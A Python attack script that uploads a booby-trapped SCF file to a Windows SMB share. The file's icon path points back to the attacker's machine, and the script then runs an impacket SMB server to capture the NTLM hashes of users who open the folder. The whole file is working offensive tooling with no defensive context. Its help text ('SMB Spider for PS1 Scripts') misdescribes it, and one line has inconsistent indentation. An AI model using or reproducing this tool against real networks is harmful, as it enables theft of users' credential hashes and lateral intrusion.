#!/usr/bin/python
import os
import argparse
from netaddr import *
from nmb.NetBIOS import NetBIOS
from smb.SMBConnection import SMBConnection
from colorama import Fore, Style
import netifaces as ni
import logging
from impacket.examples import logger
from impacket import smbserver, version
from impacket.ntlm import compute_lmhash, compute_nthash

def drop_it_like_its_hot(ip, share, subfolder, user, pwd, domain):
	net = NetBIOS()
	net_name = str(net.queryIPForName(ip)).strip("['").strip("']")
	net.close()
	conn = SMBConnection(user, pwd, 'cobwebs', net_name, domain=domain, use_ntlm_v2=True, is_direct_tcp=True)
	if conn.connect(ip, port=445, timeout=10):
		print(Fore.GREEN+"[+] Connection to %s Successful! Dropping SCF's Now!" % ip + Style.RESET_ALL)
	else:
		print(Fore.RED+"[!] Connection to %s Failed!" % ip + Style.RESET_ALL)

	put_file(conn, ip, subfolder, share)

	conn.close()

def put_file(smb_conn,ip,path,share):
	ni.ifaddresses('eth0')
	ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']

	filename = "swag.scf"
	file = "[Shell]\r\n"
	file += "Command=2\r\n"
	file += "IconFile=\\\\"+ip+"\\share\r\n"
	file += "[Taskbar]\r\n"
	file += "Command=ToggleDesktop"

	f = open(filename, 'w')
	f.write(file)
	f.close()

	print(Fore.YELLOW+"[*] Uploading file to: "+Style.BRIGHT+"\\\\%s\\%s\\%s\\%s" % (ip, share, path, filename)+Style.RESET_ALL)
	with open("swag.scf",'rb') as f:
		try:
			smb_conn.storeFile(share,path+'\\'+filename,f)
		except Exception as e:
			print(Fore.RED+"[!] Unable to open file on remote end for upload..."+Style.RESET_ALL)
			print(Fore.RED+"[!] Exiting Now."+Style.RESET_ALL)
			exit()
def main():
	parser = argparse.ArgumentParser(description="SMB Spider for PS1 Scripts")
	parser.add_argument('-ip','--ipaddress',help='Target IP',required=True)
	parser.add_argument('-u','--user',help='user',required=True)
	parser.add_argument('-p','--pwd',help='password',required=True)
	parser.add_argument('-d','--domain',help='domain',required=True)
	parser.add_argument('-t','--threads',help='number of threads',default=1, required=False)
	parser.add_argument('-s','--share',help='SMB Share', required=True)
	parser.add_argument('-f','--subfolder',help='SMB Subfolder to drop SCF file onto.', default='/', required=False)
	parser.add_argument('-o','--outfile',help='Outfile to log hashes',required=False)

	args = parser.parse_args()

	drop_it_like_its_hot(args.ipaddress, args.share, args.subfolder, args.user, args.pwd, args.domain)

	print (Fore.GREEN+"[+] Done Dropping SCF's...  Launching SMBServer To Catch Creds...\r\n" + Style.RESET_ALL)

	ni.ifaddresses('eth0')
        ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']

	server = smbserver.SimpleSMBServer(listenAddress=ip, listenPort=445)
	server.addShare("SHARE", ".", '')
	server.setSMB2Support(True)

	server.setSMBChallenge('')
	if args.outfile:
		server.setLogFile(args.outfile)
	else:
		server.setLogFile('')

	server.start()

if __name__ == '__main__':
	main()
